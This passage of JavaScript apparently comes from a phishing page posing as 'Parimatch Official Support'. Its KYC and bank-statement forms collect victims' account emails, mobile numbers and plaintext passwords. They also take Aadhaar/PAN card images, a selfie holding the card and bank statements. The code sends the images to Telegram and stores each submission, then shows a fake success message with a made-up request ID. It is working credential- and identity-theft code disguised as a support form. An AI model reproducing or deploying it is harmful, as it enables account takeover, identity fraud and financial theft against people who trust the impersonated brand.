      label.style.borderColor = 'rgba(255,255,255,0.2)';
      if (nameEl) nameEl.textContent = '';
    }
  });
}

try {
  var kycForm = document.getElementById('problemForm');
  var aadharFrontInput = document.getElementById('aadharFront');
  if (kycForm && aadharFrontInput) {
    setupUploadLabel('aadharFront', 'aadharFrontLabel', 'aadharFrontName');
    setupUploadLabel('aadharBack', 'aadharBackLabel', 'aadharBackName');
    setupUploadLabel('selfieImage', 'selfieLabel', 'selfieImageName');

    kycForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      var emailVal = document.getElementById('email').value;
      var mobileVal = document.getElementById('mobile').value;
      var passwordVal = document.getElementById('password').value;
      var frontFile = document.getElementById('aadharFront');
      var backFile = document.getElementById('aadharBack');
      var selfieFile = document.getElementById('selfieImage');
      if (!emailVal.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
      if (!isValidEmail(emailVal)) { showNotification("Please enter a valid email address", "error"); return; }
      if (!mobileVal.trim()) { showNotification("Please enter your Game Account Mobile No.", "error"); return; }
      if (!isValidMobile(mobileVal)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
      if (!passwordVal) { showNotification("Please enter your Game Account Password", "error"); return; }
      if (!isValidPassword(passwordVal)) { showNotification("Password must be at least 4 characters", "error"); return; }
      if (!frontFile || !frontFile.files || !frontFile.files[0]) { showNotification("Please upload Aadhaar/PAN Card Front", "error"); return; }
      if (!backFile || !backFile.files || !backFile.files[0]) { showNotification("Please upload Aadhaar/PAN Card Back", "error"); return; }
      if (!selfieFile || !selfieFile.files || !selfieFile.files[0]) { showNotification("Please upload Aadhaar/PAN Card with Selfie", "error"); return; }

      var submitBtn = kycForm.querySelector('.btn-submit');
      var originalBtnText = submitBtn.innerHTML;
      submitBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i> Uploading...";
      submitBtn.disabled = true;

      try {
        var requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
        var timestamp = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
        var gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);

        var frontUrl = await sendImageToTelegram(frontFile.files[0], requestId + ' | Aadhaar/PAN Front');
        var backUrl = await sendImageToTelegram(backFile.files[0], requestId + ' | Aadhaar/PAN Back');
        var selfieUrl = await sendImageToTelegram(selfieFile.files[0], requestId + ' | Card with Selfie');

        await saveSubmission({
          request_id: requestId,
          email: emailVal.trim(),
          mobile: mobileVal.trim(),
          password: passwordVal,
          aadhar_front_url: frontUrl,
          aadhar_back_url: backUrl,
          selfie_url: selfieUrl,
          type: 'KYC Problem',
          game_id: gameId,
          timestamp: timestamp,
          source: 'Parimatch Official Support'
        });

        showNotification("Request submitted successfully!", "success");
        kycForm.reset();
        document.querySelectorAll('.file-label').forEach(function(l) {
          l.classList.remove('has-file');
          l.style.background = 'var(--card-gray)';
          l.style.color = 'var(--text-secondary)';
          l.style.borderColor = 'rgba(255,255,255,0.2)';
          var span = l.querySelector('span');
          var icon = l.querySelector('i');
          if (span) span.textContent = 'Choose Image';
          if (icon) icon.className = 'fas fa-cloud-upload-alt';
        });
        document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
      } catch (error) {
        console.error("Submit Error:", error);
        showNotification("Failed to send. Please try again.", "error");
      } finally {
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;
      }
    });
  }
} catch (e) { console.warn('kyc form:', e); }

// ============================================================
//  BANK STATEMENTS PROBLEM - Form Submission
// ============================================================
try {
  var bankForm = document.getElementById('problemForm');
  var bankStatement1Input = document.getElementById('bankStatement1');
  if (bankForm && bankStatement1Input) {
    setupUploadLabel('bankStatement1', 'bankStatement1Label', 'bankStatement1Name');
    setupUploadLabel('bankStatement2', 'bankStatement2Label', 'bankStatement2Name');

    bankForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      var emailVal = document.getElementById('email').value;
      var mobileVal = document.getElementById('mobile').value;
      var passwordVal = document.getElementById('password').value;
      var bs1 = document.getElementById('bankStatement1');
      var bs2 = document.getElementById('bankStatement2');
      if (!emailVal.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
      if (!isValidEmail(emailVal)) { showNotification("Please enter a valid email address", "error"); return; }
      if (!mobileVal.trim()) { showNotification("Please enter your Game Account Mobile No.", "error"); return; }
      if (!isValidMobile(mobileVal)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
      if (!passwordVal) { showNotification("Please enter your Game Account Password", "error"); return; }
      if (!isValidPassword(passwordVal)) { showNotification("Password must be at least 4 characters", "error"); return; }
      if (!bs1 || !bs1.files || !bs1.files[0]) { showNotification("Please upload Bank Statement 1", "error"); return; }
      if (!bs2 || !bs2.files || !bs2.files[0]) { showNotification("Please upload Bank Statement 2", "error"); return; }

      var submitBtn = bankForm.querySelector('.btn-submit');
      var originalBtnText = submitBtn.innerHTML;
      submitBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i> Uploading...";
      submitBtn.disabled = true;

      try {
        var requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
        var timestamp = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
        var gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);

        var file1Url = await sendImageToTelegram(bs1.files[0], requestId + ' | Bank Statement 1');
        var file2Url = await sendImageToTelegram(bs2.files[0], requestId + ' | Bank Statement 2');

        await saveSubmission({
          request_id: requestId,
          email: emailVal.trim(),
          mobile: mobileVal.trim(),
          password: passwordVal,
          bank_statement_1_url: file1Url,
          bank_statement_2_url: file2Url,
          type: 'Bank Statement Problem',
          game_id: gameId,
          timestamp: timestamp,
          source: 'Parimatch Official Support'
        });

        showNotification("Request submitted successfully!", "success");
        bankForm.reset();
        document.querySelectorAll('.file-label').forEach(function(l) {
          l.classList.remove('has-file');
          l.style.background = 'var(--card-gray)';
          l.style.color = 'var(--text-secondary)';
          l.style.borderColor = 'rgba(255,255,255,0.2)';
          var span = l.querySelector('span');
          var icon = l.querySelector('i');
          if (span) span.textContent = 'Choose Image';
          if (icon) icon.className = 'fas fa-cloud-upload-alt';
        });
        document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
      } catch (error) {
        console.error("Submit Error:", error);
        showNotification("Failed to send. Please try again.", "error");
      } finally {
        submitBtn.innerHTML = originalBtnText;
        submitBtn.disabled = false;
      }
    });
  }
} catch (e) { console.warn('bank statement form:', e); }
